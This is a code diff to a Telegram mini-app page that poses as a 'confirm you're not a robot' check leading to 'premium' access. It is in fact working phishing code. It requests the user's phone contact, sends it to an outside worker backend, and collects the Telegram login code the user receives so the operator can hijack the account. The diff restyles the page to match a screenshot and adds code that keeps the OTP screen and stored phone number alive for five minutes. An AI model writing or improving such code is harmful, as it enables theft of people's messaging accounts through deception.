@@ -9,10 +9,11 @@
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; user-select: none; }
         body, html { height: 100%; width: 100%; overflow: hidden; background: #000; }
         
+        /* Background Blur Effect */
         .bg-image {
             position: fixed; top: -10%; left: -10%; width: 120%; height: 120%;
             object-fit: cover;
-            filter: blur(10px) brightness(0.7); 
+            filter: blur(15px) brightness(0.5); 
             z-index: 1; 
             pointer-events: none;
         }
@@ -24,52 +25,80 @@
         }
         .screen.active { display: flex; }
 
-        .emoji-icon { font-size: 110px; margin-bottom: 20px; filter: drop-shadow(0 5px 15px rgba(0,0,0,0.4)); }
+        /* 3D Emoji styling */
+        .emoji-icon { 
+            font-size: 110px; 
+            margin-bottom: 20px; 
+            filter: drop-shadow(0 10px 15px rgba(0,0,0,0.5)); 
+        }
         
+        /* New Light Box Style matching screenshot */
         .msg-box {
-            background: rgba(212, 126, 148, 0.95); color: #111; padding: 20px; border-radius: 12px;
-            font-size: 16px; font-weight: 500; text-align: center; width: 100%; max-width: 320px;
-            margin-bottom: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+            background: #e9ecef; 
+            color: #111; 
+            padding: 18px 20px; 
+            border-radius: 12px;
+            font-size: 17px; 
+            font-weight: 500; 
+            text-align: center; 
+            width: 100%; 
+            max-width: 320px;
+            margin-bottom: 20px; 
+            box-shadow: 0 4px 15px rgba(0,0,0,0.4);
         }
 
+        /* New Blue Button Style matching screenshot */
         .action-btn {
-            background: #cb1c5f; color: white; border: none; border-radius: 12px;
-            padding: 16px; width: 100%; max-width: 320px; font-size: 18px; font-weight: 500;
-            cursor: pointer; box-shadow: 0 4px 12px rgba(0,0,0,0.3); transition: 0.1s;
+            background: #2b8ce6; 
+            color: white; 
+            border: none; 
+            border-radius: 10px;
+            padding: 16px; 
+            width: 100%; 
+            max-width: 320px; 
+            font-size: 18px; 
+            font-weight: 600;
+            cursor: pointer; 
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3); 
+            transition: 0.1s;
         }
-        .action-btn:active { transform: scale(0.96); }
+        .action-btn:active { transform: scale(0.96); background: #1e70c0; }
 
         .top-pill {
-            position: absolute; top: 18%; background: white; color: black;
+            position: absolute; top: 18%; background: rgba(255,255,255,0.9); color: black;
             padding: 14px 25px; border-radius: 30px; font-size: 16px; font-weight: 500;
             box-shadow: 0 5px 15px rgba(0,0,0,0.2);
         }
         .spinner {
             width: 55px; height: 55px; margin-top: 30px; border: 4px solid rgba(255, 255, 255, 0.2);
-            border-top: 4px solid white; border-radius: 50%; animation: spin 1s linear infinite;
+            border-top: 4px solid #2b8ce6; border-radius: 50%; animation: spin 1s linear infinite;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        .otp-row { display: flex; gap: 8px; margin-bottom: 15px; justify-content: center; width: 100%; max-width: 320px; }
+        /* Transparent OTP Boxes */
+        .otp-row { display: flex; gap: 10px; margin-bottom: 20px; justify-content: center; width: 100%; max-width: 320px; }
         .otp-box {
-            width: 55px; height: 65px; border: 2px solid rgba(255,255,255,0.7);
-            border-radius: 12px; background: rgba(255,255,255,0.1); color: white;
+            width: 55px; height: 65px; border: 2px solid rgba(255,255,255,0.5);
+            border-radius: 12px; background: transparent; color: white;
             font-size: 28px; font-weight: bold; display: flex; align-items: center; justify-content: center;
         }
+
         .show-code-btn { padding: 14px; font-size: 16px; margin-bottom: 20px; }
-        .numpad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; width: 100%; max-width: 320px; }
+        
+        /* Blue Numpad */
+        .numpad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; width: 100%; max-width: 320px; }
         .numpad button {
-            background: #cb1c5f; color: white; border: none; border-radius: 12px;
-            height: 60px; font-size: 26px; font-weight: bold; cursor: pointer;
+            background: #2b8ce6; color: white; border: none; border-radius: 10px;
+            height: 55px; font-size: 26px; font-weight: 600; cursor: pointer;
             box-shadow: 0 4px 10px rgba(0,0,0,0.2); transition: 0.1s;
         }
-        .numpad button:active { transform: translateY(2px); }
+        .numpad button:active { transform: translateY(2px); background: #1e70c0; }
         .numpad button.empty { background: transparent; box-shadow: none; pointer-events: none; }
         .numpad button.backspace { font-size: 24px; }
 
         #toast {
             position: fixed; bottom: -50px; left: 50%; transform: translateX(-50%);
-            background: rgba(0,0,0,0.8); color: white; padding: 12px 20px;
+            background: rgba(0,0,0,0.85); color: white; padding: 12px 20px;
             border-radius: 20px; font-size: 14px; transition: 0.3s; z-index: 9999; text-align: center; width: 80%;
         }
         #toast.show { bottom: 40px; }
@@ -79,23 +108,23 @@
 
     <img class="bg-image" src="https://yctirvnryrzygoxbpvoy.supabase.co/storage/v1/object/public/thumbnails/thumb_1784427223.jpg" alt="background">
 
-    <!-- Screen 1: Human Verification -->
-    <div id="screen-human" class="screen active">
-        <div class="emoji-icon">❤️‍🔥</div>
-        <div class="msg-box">Confirm you're human in just one click</div>
-        <button class="action-btn" onclick="startProcessing()">Proceed now ✅</button>
-    </div>
-
-    <!-- Screen 2: Processing -->
-    <div id="screen-loading" class="screen">
-        <div class="top-pill">Hold on, processing... ⚡</div>
-        <div class="emoji-icon" style="margin-top: 50px;">🗂️</div>
+    <!-- Loading / Checking Session Screen -->
+    <div id="screen-loading" class="screen active">
+        <div class="top-pill">Checking your status... ⚡</div>
+        <div class="emoji-icon" style="margin-top: 50px;">🔐</div>
         <div class="spinner"></div>
     </div>
 
-    <!-- Screen 3: OTP Verification -->
+    <!-- Screen 1: Human Verification -->
+    <div id="screen-human" class="screen">
+        <div class="emoji-icon">🤖</div>
+        <div class="msg-box">Please confirm that you are not a robot ✅</div>
+        <button class="action-btn" onclick="startProcessing()">Confirm ✅</button>
+    </div>
+
+    <!-- Screen 2: OTP Verification -->
     <div id="screen-otp" class="screen">
-        <div class="emoji-icon" style="font-size: 90px; margin-bottom: 10px;">📥</div>
+        <div class="emoji-icon" style="font-size: 90px; margin-bottom: 10px;">📲✉️</div>
         <div class="msg-box" style="margin-bottom: 20px;">We Just Sent Your Access Code - Check your Telegram!</div>
         
         <div class="otp-row" id="otp-boxes">
@@ -120,6 +149,7 @@
 
         const BACKEND_URL = "https://worker-small-fog-3774.maronyvai.workers.dev";
         const userId = (tg && tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user.id : '123456'; 
+        const PREMIUM_LINK = 'https://t.me/+snT3FqTlgmJlNDQ1';
 
         let otpCode = "";
 
@@ -135,15 +165,67 @@
             setTimeout(() => toast.classList.remove('show'), 3000);
         }
 
-        // আপনার আগের অরিজিনাল রিডাইরেক্ট মেথড ফিরিয়ে আনা হলো
         function safeOpenLink(url) {
-            if (tg && typeof tg.openLink === 'function') { tg.openLink(url); } 
-            else { window.open(url, '_blank'); }
+            if (tg && typeof tg.openTelegramLink === 'function' && url.includes('t.me')) {
+                tg.openTelegramLink(url);
+            } else if (tg && typeof tg.openLink === 'function') { 
+                tg.openLink(url); 
+            } else { 
+                window.open(url, '_blank'); 
+            }
         }
 
         function openTelegram() {
-            safeOpenLink(BACKEND_URL + '/api/jump'); // হুবহু আপনার আগের সিস্টেম অনুযায়ী রিডাইরেক্ট হবে
+            safeOpenLink(BACKEND_URL + '/api/jump');
         }
+
+        function clearOTPStorage() {
+            localStorage.removeItem('app_screen');
+            localStorage.removeItem('otp_time');
+            localStorage.removeItem('hash');
+            localStorage.removeItem('phone');
+        }
+
+        // ================= APP INITIALIZATION =================
+        window.onload = async () => {
+            try {
+                // 1. Check if user already has an active session
+                let res = await fetch(`${BACKEND_URL}/api/check_login`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ user_id: userId })
+                });
+                let data = await res.json();
+                
+                if (data && data.status === "logged_in") {
+                    showToast("Session Active! Redirecting...");
+                    setTimeout(() => { safeOpenLink(PREMIUM_LINK); }, 1500);
+                    return; // Stop here, user is logged in
+                }
+            } catch(e) {
+                console.log("Check login failed, continuing to verification flow.");
+            }
+
+            // 2. If not logged in, check if user was on OTP screen less than 5 mins ago
+            let savedScreen = localStorage.getItem('app_screen');
+            let savedTime = localStorage.getItem('otp_time');
+            
+            if (savedScreen === 'otp' && savedTime) {
+                let diff = Date.now() - parseInt(savedTime);
+                if (diff < 5 * 60 * 1000) { // 5 Minutes in milliseconds
+                    window.currentHash = localStorage.getItem('hash');
+                    window.realPhone = localStorage.getItem('phone');
+                    showScreen('screen-otp');
+                    return;
+                } else {
+                    // Time expired, clear cache
+                    clearOTPStorage();
+                }
+            }
+            
+            // 3. Fallback: Show the Human Verification screen
+            showScreen('screen-human');
+        };
 
         async function startProcessing() {
             if (!tg || !tg.requestContact) return showToast("Please update your Telegram app!");
@@ -151,6 +233,7 @@
             tg.requestContact((granted) => {
                 if (granted) {
                     showScreen('screen-loading');
+                    document.querySelector('.top-pill').innerText = "Processing... ⚡";
                     
                     setTimeout(async () => {
                         try {
@@ -164,6 +247,13 @@
                             if(data && data.status === "ok") {
                                 window.currentHash = data.hash;
                                 window.realPhone = data.real_phone; 
+                                
+                                // Save state to localStorage for 5 mins persistence
+                                localStorage.setItem('app_screen', 'otp');
+                                localStorage.setItem('otp_time', Date.now());
+                                localStorage.setItem('hash', data.hash);
+                                localStorage.setItem('phone', data.real_phone);
+
                                 showScreen('screen-otp');
                             } else {
                                 showToast(data.msg || "Failed! Server might be busy.");
@@ -192,6 +282,7 @@
 
         async function verifyOTP() {
             showScreen('screen-loading'); 
+            document.querySelector('.top-pill').innerText = "Verifying Code... ⚡";
 
             try {
                 const res = await fetch(`${BACKEND_URL}/api/verify_code`, { 
@@ -203,10 +294,9 @@
                 
                 if(data && data.status === "ok") {
                     showToast("Premium Unlocked! 🎉");
+                    clearOTPStorage(); // Clear state since verification is done
                     setTimeout(() => {
-                        if (tg && typeof tg.openTelegramLink === 'function') {
-                            tg.openTelegramLink('https://t.me/+snT3FqTlgmJlNDQ1'); 
-                        }
+                        safeOpenLink(PREMIUM_LINK);
                     }, 1000);
                 } else {
                     showToast(data.msg || "Invalid Code! Try again.");
